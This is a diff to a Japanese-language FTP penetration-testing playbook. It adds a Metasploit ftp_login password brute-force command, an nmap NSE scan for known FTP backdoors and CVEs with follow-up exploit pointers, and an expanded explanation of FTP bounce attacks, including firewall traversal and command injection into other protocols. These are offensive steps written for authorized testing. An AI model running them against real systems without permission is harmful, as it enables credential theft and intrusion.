@@ -284,6 +284,14 @@ ncrack -p ftp --user [USER] -P /usr/share/wordlists/rockyou.txt [TARGET_IP] -T2 
 
 # [Attacker] nmap ftp-brute スクリプト（nmap だけで完結）
 nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=passwords.txt [TARGET_IP]
+
+# [Attacker] Metasploit auxiliary scanner（msf 派の hydra 代替）
+msfconsole -q -x "use auxiliary/scanner/ftp/ftp_login; \
+  set RHOSTS [TARGET_IP]; \
+  set USER_FILE users.txt; \
+  set PASS_FILE /usr/share/wordlists/rockyou.txt; \
+  set STOP_ON_SUCCESS true; \
+  run; exit"
 ```
 
 **観測される出力 → 次のアクション:**
@@ -294,13 +302,42 @@ nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=passwords.tx
 | 全 cred が拒否 | 認証情報全滅 / 接続元 IP 制限 | §8 CVE 攻撃に切替、または OSINT で username 候補追加 |
 | 試行が極端に遅い | fail2ban / 製品側 throttle | `hydra -t 1 -W 30` で並列度 1・待機 30 秒、または `ncrack -T1` |
 | `Connection refused` を繰り返す | 接続元 IP が一時 BAN された可能性 | 別接続元 / 時間をおいて再開 |
-| hydra が動かない (timeout 多発) | 環境依存の hydra 不具合 | `medusa` / `ncrack` / `nmap ftp-brute` 代替へ |
+| hydra が動かない (timeout 多発) | 環境依存の hydra 不具合 | `medusa` / `ncrack` / `nmap ftp-brute` / `msf auxiliary/scanner/ftp/ftp_login` 代替へ |
 
 ---
 
 ## 8. 既知 CVE による直接侵入
 
 **着火条件:** §1 でバージョン文字列が取れている。version 該当の CVE が公開 PoC を持つ。
+
+### 8.0 NSE スクリプトによる既知 CVE 一括スキャン
+
+**背景:** 個別 PoC を手動で叩く前に、nmap NSE で代表的な FTP 系 CVE を一括判定できる。バージョン文字列がバナーから取れない・偽装されている場合でも、実挙動ベースで判定するため一次スクリーニングに有用。
+
+**コマンド:**
+
+```bash
+# [Attacker] 代表的な FTP 系 NSE スクリプトを一括実行
+nmap -p 21 --script "ftp-anon,ftp-bounce,ftp-vsftpd-backdoor,ftp-proftpd-backdoor,ftp-libopie,ftp-vuln-cve2010-4221" [TARGET_IP]
+
+# [Attacker] 個別実行（特定 CVE のみ）
+nmap -p 21 --script ftp-vsftpd-backdoor [TARGET_IP]            # vsftpd 2.3.4 backdoor (CVE-2011-2523) — §8.1 と同等
+nmap -p 21 --script ftp-proftpd-backdoor [TARGET_IP]           # ProFTPD 1.3.3c 混入版バックドア
+nmap -p 21 --script ftp-vuln-cve2010-4221 [TARGET_IP]          # ProFTPD 1.3.2/1.3.3 Telnet IAC heap overflow
+nmap -p 21 --script ftp-libopie [TARGET_IP]                    # FreeBSD ftpd OPIE off-by-one (CVE-2010-1938)
+```
+
+**観測される出力 → 次のアクション:**
+
+| 出力 | 示唆 | 次のアクション |
+|---|---|---|
+| `ftp-vsftpd-backdoor: VULNERABLE` | vsftpd 2.3.4 backdoor 該当 | §8.1 で手動トリガー or Metasploit 実行 |
+| `ftp-proftpd-backdoor: This installation has been backdoored` | ProFTPD 1.3.3c 混入版 | `searchsploit proftpd 1.3.3c` で PoC 確認 |
+| `ftp-vuln-cve2010-4221: VULNERABLE` | ProFTPD heap overflow 該当 | msf `exploit/freebsd/ftp/proftp_telnet_iac` / `searchsploit cve-2010-4221` |
+| `ftp-libopie: VULNERABLE` | FreeBSD ftpd OPIE off-by-one | `searchsploit cve-2010-1938`（公開 PoC は限定的） |
+| 全スクリプトが `NOT VULNERABLE` or 出力なし | NSE 既知シグネチャに該当なし | §8.3 の `searchsploit` ベースの探索に進む |
+
+**注意:** NSE 判定は**シグネチャ + 軽い動作確認ベース**で、偽陰性（パッチ未適用でも検知漏れ）も偽陽性（バナー偽装で誤検知）もある。`VULNERABLE` が出ても実 exploit 前にバージョン・OS・パッチレベルを §1 で再確認する。`--script-args=unsafe=1` を付けると更に侵襲的な判定を行うが、本番では事前合意必須。
 
 ### 8.1 vsftpd 2.3.4 backdoor (CVE-2011-2523)
 
@@ -381,7 +418,14 @@ searchsploit -m [EDB-ID]
 
 ## 9. FTP Bounce 攻撃（古典・finding 用）
 
-**背景:** FTP の `PORT` コマンドは「データコネクションの接続先を任意の IP:port に指定できる」仕様。これを悪用し、**FTP サーバを踏み台にした他ホスト・他ポートへのスキャン**が可能（RFC 959 の仕様起因）。現代のサーバは大半がこの転送を禁止しているが、稀に古い機器で残存。
+**背景:** FTP の `PORT` コマンドは「データコネクションの接続先を任意の IP:port に指定できる」仕様（RFC 959）。これにより、FTP サーバを踏み台にして **任意ホスト・任意 TCP ポートへ任意データを送出** できる。代表用途は以下:
+
+- **内部ポートスキャン**: `PORT` 応答コードの差から開閉判定（最も有名、`nmap -b` で自動化）
+- **境界 FW の透過**: bounce サーバが内部 LAN に居て外部から直接到達不能な内部ホストへ、bounce 経由で接続を発生させる
+- **source port 20 偽装**: bounce で発出される TCP の送信元ポートは 20（FTP-DATA）。古い FW では 20 番からの戻り通信を無条件許可している設定があり、これを抜けるのに使える
+- **任意プロトコルへのデータ injection**: `STOR` で配置したコマンド列ファイルを `RETR` で別ホスト・別ポートに流し、SMTP / NNTP / HTTP 等の生プロトコルへ任意コマンドを投入（Hobbit "The FTP Bounce Attack" 1995 で詳述）
+
+現代のサーバは大半が `PORT` 宛先を制御接続元 IP に限定しているため成立しないが、組み込み機器・古い NAS・レガシー FTP サーバで残存することがある。
 
 **コマンド:**
 
@@ -400,6 +444,8 @@ nmap -b anonymous:anonymous@[FTP_PROXY_IP] -p 80,443,3389 [INTERNAL_TARGET_IP]
 | `502 PORT command not allowed` / `500 Illegal PORT command` | bounce 禁止（現代の標準動作） | 通常経路に戻る |
 
 > **注意:** 成立した場合でも、`PORT [IP],[PORT_HIGH],[PORT_LOW]` の応答有無からポート開閉を推定するタイミング攻撃で、現代的なスキャンより遅い。**audit finding として記録するのが現実的な使い道**で、実 pivot に使うのは効率が悪い。
+
+> **注意（ポートスキャン以外の bounce 手順 — 古典）:** Hobbit 原典のフローは、攻撃者側で PASV listener を準備し、bounce サーバの書込可能ディレクトリ（例: `/incoming`）に「FTP コマンド列を含むファイル」を `STOR` で配置 → `PORT [TARGET_IP],[PORT_HIGH],[PORT_LOW]` + `RETR` で標的に流す、というもの。control connection を維持するためコマンドファイル末尾に約 60KB の NULL padding (`\x00` 連続) を付ける細工も併用される。**現代サーバではほぼ全滅**だが、原理を知っていると古い機器に当たった時の finding 価値判断ができる。
 
 ---
 
